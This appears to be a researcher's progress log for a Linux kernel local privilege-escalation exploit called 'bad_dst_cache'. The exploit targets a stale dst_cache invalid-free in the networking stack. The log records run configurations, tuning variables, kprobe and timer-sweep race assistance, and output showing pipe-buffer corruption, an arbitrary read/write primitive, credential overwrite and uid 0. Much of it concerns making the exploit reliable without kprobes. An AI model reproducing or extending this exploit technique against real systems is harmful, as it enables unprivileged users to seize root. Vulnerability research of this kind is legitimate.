# Best Kprobe-Assisted Root Run

Best minimal kprobe run so far:

- Folder: `old/2026-05-07_current_source_kprobe_only_cnxret_getroot_smp2/`
- Binary: current `bad_dst_cache` from the May 7 current-source build.
- Kernel/run shape: `--smp 2`, `nokaslr`, `mtu_expires=1`, unprivileged exploit via wrapper.
- Cleanup/reliability knobs:
  - `BAD_DST_CPU1_BLOCK_THREADS=1024`
  - `BAD_DST_LEAK_VULN_PIPES_ON_CLEAN_FAIL=1`
  - `BAD_DST_PIPE_CORRUPT_FIONREAD_MIN=0xc0000000`
  - Raised fd and pipe page limits before dropping privileges.
- Kprobe set:
  - only `sock_setsockopt+0xf00` (`cnxret`)

Result:

- `pipefail=1`
- `arb=1`
- `root=1`
- Root reached on attempt 2.

Important output:

```text
found corrupted pipe FIONREAD source=current index=2 size=0xc3c3c3c3
pipe probe leak accepted: page_index=135 probe=0x2b8 pipe_base=0x240 active_before=3 page=0xffffea000088b4c0 ops=0xffffffff827bf740 offset=0x0 len=0x4 flags=0x4141414100000010
Arb R/W setup
found current task: 0xffff888006de9c80
current task creds: real_cred=0xffff888006ceb840 cred=0xffff888006ceb840
capability sets overwritten
now uid/gid/euid/egid: 0/0/0/0
```

Trace evidence:

```text
p:kprobes/cnxret sock_setsockopt+3840 ...
bad_dst_cache ... cnxret ... old_ref=1 old_obs=-1 old_ops=0xffffffff836b8a40 old_flags=0x0
bad_dst_cache ... cnxret ... old_ref=1 old_obs=-1 old_ops=0xffffffff836b8a40 old_flags=0x0
```

Interpretation:

- `cnxret` is currently the minimal known kprobe-assisted setup.
- It likely works by adding cost immediately after the negative-advice call returns and before `sk_dst_cache` is assigned NULL.
- A no-kprobe run with the same wrapper reached `BAD_DST_MAX_ATTEMPTS=96` with `pipefail=6`, `arb=0`, `root=0`.

## Best No-Cnxret / No-Kprobe Root Run

Best no-`cnxret` result so far:

- Folder: `old/2026-05-07_no_cnxret_no_kprobe_earlytimer_smp2/`
- Kprobe set: none; `kprobe_events.actual` is empty.
- Timer sweep:
  - `BAD_DST_TIMER_SWEEP_START_NS=25000`
  - `BAD_DST_TIMER_SWEEP_STEP_NS=4096`
  - `BAD_DST_TIMER_SWEEP_COUNT=20`
  - `BAD_DST_MAX_ATTEMPTS=120`
- Result:
  - `pipefail=21`
  - `arb=1`
  - `root=1`
  - Root reached on attempt 45.

Important output:

```text
found corrupted pipe FIONREAD source=current index=7 size=0xc3c3c3c3
pipe probe leak accepted: page_index=114 probe=0x5b8 pipe_base=0x540 active_before=3 page=0xffffea0000910e40 ops=0xffffffff827bf740 offset=0x0 len=0x4 flags=0x4141414100000010
Arb R/W setup
now uid/gid/euid/egid: 0/0/0/0
```

Repeat status:

- `old/2026-05-07_no_cnxret_no_kprobe_earlytimer_repeat_smp2/`: no kprobes, same early timer sweep, stopped at `pipefail=30`, `arb=0`, `root=0`.
- `old/2026-05-07_no_cnxret_no_kprobe_earlytimer_lockoracle_smp2/`: no kprobes plus unprivileged lock oracle, stopped at `pipefail=30`, `arb=0`, `root=0`, but did produce one `dst_release underflow` from `ipv4_negative_advice -> sock_setsockopt+0xf00`.

Interpretation:

- `cnxret` is not strictly required; the early timer sweep has achieved root with no kprobes.
- Reliability is still weak. The no-kprobe path can land the stale-dst invalid-free, but pipe-buffer overlap is the current unreliable stage.
